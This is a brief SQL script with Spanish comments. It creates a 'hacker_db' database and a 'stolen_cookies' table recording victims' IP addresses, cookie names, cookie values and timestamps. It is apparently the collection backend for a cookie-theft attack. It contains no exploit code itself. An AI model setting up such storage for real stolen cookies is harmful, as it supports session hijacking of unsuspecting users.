CREATE DATABASE IF NOT EXISTS hacker_db;
USE hacker_db;

CREATE TABLE IF NOT EXISTS stolen_cookies (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(50) NOT NULL,
    cookie_name VARCHAR(255) NOT NULL,  -- Nueva columna para el nombre de la cookie
    cookie_value TEXT NOT NULL,         -- Nueva columna para el valor de la cookie
    timestamp DATETIME NOT NULL
);